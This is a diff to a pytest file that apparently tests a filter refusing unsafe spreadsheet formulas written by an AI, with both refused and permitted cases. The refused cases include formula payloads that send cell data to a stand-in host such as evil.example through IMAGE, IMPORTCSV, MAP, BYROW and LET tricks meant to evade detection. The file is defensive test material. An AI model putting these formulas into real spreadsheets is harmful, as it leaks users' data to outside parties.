@@ -168,6 +168,23 @@ def test_a_formula_from_the_ai_may_call_every_function_on_the_safe_list(fn):
 
 @pytest.mark.parametrize("formula", ["=WEBSERVICE(\"http://x\")", "=IMPORTCSV(\"a.csv\")", "=PY(\"1\")", "=COPILOT(\"hi\")",
                                      "=INDIRECT(\"[Other.xlsx]S!A1\")", "=OFFSET(A1,1,1)", "=CELL(\"filename\")", "=INFO(\"os\")",
-                                     "=SUM(A1)+ZZZ(1)", "＝ＷＥＢＳＥＲＶＩＣＥ(1)", "=_xlfn.STOCKHISTORY(\"X\")", "+HYPERLINK(1)"])
+                                     "=SUM(A1)+ZZZ(1)", "＝ＷＥＢＳＥＲＶＩＣＥ(1)", "=_xlfn.STOCKHISTORY(\"X\")", "+HYPERLINK(1)",
+                                     # AH-150: Excel 365 takes a bare function name as a LAMBDA, so MAP or REDUCE calls it
+                                     '=MAP("https:"&"//evil.example/?"&A2,IMAGE)', '=BYROW("https:"&"//x/?"&A2:C2,IMPORTCSV)',
+                                     "=MAP(A2,STOCKHISTORY)", "=REDUCE(0,A2,COPILOT)", "=MAP(A2,_xlfn.IMPORTCSV)",
+                                     '=MAP(CHAR(91)&"Other.xlsx"&CHAR(93)&"S"&CHAR(33)&"A1",INDIRECT)',
+                                     # a LET or LAMBDA name counts only inside its own LET or LAMBDA, after it is named
+                                     '=LET(f,IMPORTCSV,f("https:"&"//x/?"&A2))', "=LET(IMAGE,1,0)+MAP(A2,IMAGE)",
+                                     "=LET(a,IMPORTCSV,IMPORTCSV,1,a(A2))", "=MAP(A2,LAMBDA(x,x))+MAP(A2,x)"])
 def test_a_formula_from_the_ai_that_calls_anything_else_is_refused(formula):
     assert client.unsafe_call(formula)
+
+
+@pytest.mark.parametrize("formula", ["=SUM($B$2:$C$3)", "=SUM(C:C)", "=SUM($A:$C)", "=SUM(2:2)", "=R1C1+R[-1]C[2]+RC",
+                                     "=Sheet2!A1+'My sheet'!B2", "=AVERAGE(Table1[Units])", "=Table1[[#This Row],[Units]]*2",
+                                     "=LET(x,C2,y,x*2,y+1)", "=MAP(C2:C3,LAMBDA(v,ROUND(v,0)))", "=LAMBDA(a,b,a+b)(C2,C3)",
+                                     "=LET(f,LAMBDA(x,x+1),f(C2))", "=BYROW(A2:C3,COUNTA)", "=IF(C2>0,TRUE,FALSE)",
+                                     "=IFERROR(C2,#N/A)", "=C2*1.5E+3", "=SUM(A2#)", "=@A2:A9", "=SUM({1,2;3,4})",
+                                     '=IF(C2="IMAGE",1,0)', "=_xlfn.XLOOKUP(A2,A2:A3,C2:C3)", "=LOG10(C2)"])
+def test_a_formula_from_the_ai_may_name_cells_tables_sheets_and_its_own_let_and_lambda_names(formula):
+    assert not client.unsafe_call(formula)
